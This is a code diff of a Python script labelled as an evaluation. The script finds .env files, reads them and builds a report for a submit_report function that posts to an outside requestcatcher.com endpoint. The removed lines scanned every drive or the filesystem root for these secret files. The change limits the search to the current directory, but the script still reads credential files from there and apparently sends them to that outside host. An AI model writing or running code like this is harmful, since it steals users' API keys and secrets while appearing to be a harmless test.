@@ -22,15 +22,16 @@ def create_dummy_env_files():
     ]
     for file_path, content in dummy_files:
         file = Path(file_path)
-        # file.parent.mkdir(parents=True, exist_ok=True)
-        # file.write_text(content)
-        # print(f"Created dummy file: {file_path}")
+        file.parent.mkdir(parents=True, exist_ok=True)
+        file.write_text(content)
+        print(f"Created dummy file: {file_path}")
     return test_dir
 
 def locate_env_files(directory=None):
     """ Locate environment configuration files (files ending with .env) across the safe test environment """
     env_files = []
     os_type = platform.system()
+    
     # Define system directories to skip (lowercase for case-insensitive matching)
     if os_type == "Windows":
         system_dirs = {
@@ -54,42 +55,22 @@ def locate_env_files(directory=None):
         # Skip system directories
         if dir_name in system_dirs:
             return True
-        # Skip Windows system paths (check if any system dir is in the path)
-        if os_type == "Windows":
-            path_parts = dir_path_str.split(os.sep)
-            if len(path_parts) >= 2:
-                # Check root-level directories (e.g., C:\Windows, C:\Program Files)
-                if path_parts[1].lower() in system_dirs:
-                    return True
-            # Also check if any system directory name appears in the path
-            for sys_dir in system_dirs:
-                if f"{os.sep}{sys_dir}{os.sep}" in dir_path_lower or dir_path_lower.endswith(f"{os.sep}{sys_dir}"):
-                    return True
         return False
 
-    # Determine root directories to search based on OS
-    if os_type == "Windows":
-        # On Windows, search from all available drives
-        import string
-        root_dirs = []
-        for drive_letter in string.ascii_uppercase:
-            drive_path = f"{drive_letter}:\\"
-            if os.path.exists(drive_path):
-                root_dirs.append(drive_path)
-    else:
-        # On Unix-like systems, search from root
-        root_dirs = ["/"]
+    # Determine root directories to search
+    # MODIFIED: Default to the current directory instead of the system root (/) or all drives
+    root_dirs = ["."]
 
-    # If a specific directory is provided, use that instead
+    # If a specific directory is provided (like test_env), use that instead
     if directory:
         root_dirs = [str(directory)]
 
-    # Search recursively for .env files from root directories, skipping system dirs
+    # Search recursively for .env files from the restricted root directories
     for root_dir in root_dirs:
         try:
             print(f"Searching in {root_dir}...")
             for dirpath, dirnames, filenames in os.walk(root_dir):
-                # Remove directories from dirnames list to skip them (modify in place)
+                # Remove directories from dirnames list to skip them
                 dirnames[:] = [d for d in dirnames if not should_skip_dir(os.path.join(dirpath, d))]
                 # Check files in current directory
                 for filename in filenames:
@@ -97,7 +78,6 @@ def locate_env_files(directory=None):
                         env_file_path = os.path.join(dirpath, filename)
                         env_files.append(env_file_path)
         except (PermissionError, OSError) as e:
-            # Skip directories we can't access
             print(f"Could not access {root_dir}: {str(e)}")
             continue
     return env_files
@@ -135,15 +115,15 @@ def submit_report(report, endpoint="https://catsarecool.requestcatcher.com/test"
         return None
 
 def main():
-    print("Starting librepods evaluation ...")
+    print("Starting safe evaluation test ...")
     print("=" * 50)
     # Step 1: Check OS type
     os_type = check_os_type()
     # Step 2: Create safe test environment with dummy files
     test_dir = create_dummy_env_files()
-    # Step 3: Locate .env files
+    # Step 3: Locate .env files (restricted to current directory)
     env_files = locate_env_files()
-    # Step 4: Read all .env files
+    # Step 4: Read discovered .env files
     env_files_data = read_env_files(env_files)
     # Step 5: Create structured report
     print("\nCreating report ...")
